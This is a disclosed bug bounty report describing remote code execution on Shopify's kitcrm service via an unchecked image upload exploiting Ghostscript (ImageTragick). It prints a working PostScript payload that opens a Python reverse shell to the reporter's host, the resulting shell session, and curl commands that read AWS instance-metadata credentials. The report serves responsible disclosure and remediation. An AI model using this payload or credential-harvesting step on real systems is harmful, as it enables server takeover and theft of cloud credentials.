# H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products

## Report Details
- **Report ID**: 422944
- **URL**: https://hackerone.com/reports/422944
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-12T12:41:23.232Z
- **Disclosed**: 2020-02-06T00:29:03.449Z

## Reporter
- **Username**: fransrosen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

### Background

kitcrm.com allows the administrator to upload priority product images located at:

https://kitcrm.com/seller/onboarding/1

{F359446}

{F359447}

These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops

```

Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit:

{F359445}

{F359443}

{F359444}

A reverse shell will be created to my host:

```sh
Listening on [0.0.0.0] (family 0, port 8080)
Connection from [52.38.69.6] port 8080 [tcp/http-alt] accepted (family 2, sport 35486)
sh: no job control in this shell
sh-4.2$ whoami
whoami
deploy
sh-4.2$ ls
ls
app
bin
config
config.ru
db
deploy
dev.yml
doc
Gemfile
Gemfile.lock
integration
lib
log
misc
package.json
public
railgun.yml
Rakefile
README.md
script
service.yml
spec
tmp
vendor
yarn.lock
```

I can also confirm this is internally for Shopify since the README refers to an internal repo of github.com/Shopify:

```
sh-4.2$ cat README.md
cat README.md
This is the Kit CRM Repo.

## Continuous Integration

[![CircleCI](███████)

## Important resources

### Production

- datadog metrics dashboards [open](█████)
- bugsnag for exceptions [open](██████)
- papertrail for logs [open](████████)
- newrelic for some other monitoring [open](████)


## Deploying

See [Deploying Kit](█████)

## Development setup:

Please see [Dev Environment Setup](████)


## Initializers

to help us order initializers we use number prefixes. These will help us be explicit about ordering.

| Range | What it's for |
| ----- | ------------- |
| 0-9   | Configurations many things including rails would use |
| 10-19 | Rails configuration |
| 20-39 | Gem configuration |
| 40-59 | Adjusting any configured libraries |
| 60-89 | Make use of any libraries |
| 90-99 | Just need these to run but don't really care about the order |
sh-4.2$
```

I also verified I can access AWS metadata:

```sh
sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

██████████

sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
                
{
  "Code" : "Success",
  "LastUpdated" : "2018-10-12T11:39:10Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "█████████",
  "SecretAccessKey" : "█████████",
  "Token" : "██████████",
  "Expiration" : "2018-10-12T18:09:12Z"
}
```

I did try to list S3-buckets, and checked the assumed-role:

```
{
    "UserId": "█████",
    "Account": "█████",
    "Arn": "arn:aws:sts::████████:█████████"
}
```

You should immediately make sure Postscript files cannot be uploaded here, or urgently update or remove Ghostscript from the imagemagick instance.

Regards,
Frans and Mathias

## Impact

#

## Attachments
- Screen_Shot_2018-10-12_at_14.36.55.png
- Screen_Shot_2018-10-12_at_14.37.00.png
- Screen_Shot_2018-10-12_at_14.36.47.png
- Screen_Shot_2018-10-12_at_14.27.32.png
- Screen_Shot_2018-10-12_at_14.27.35.png
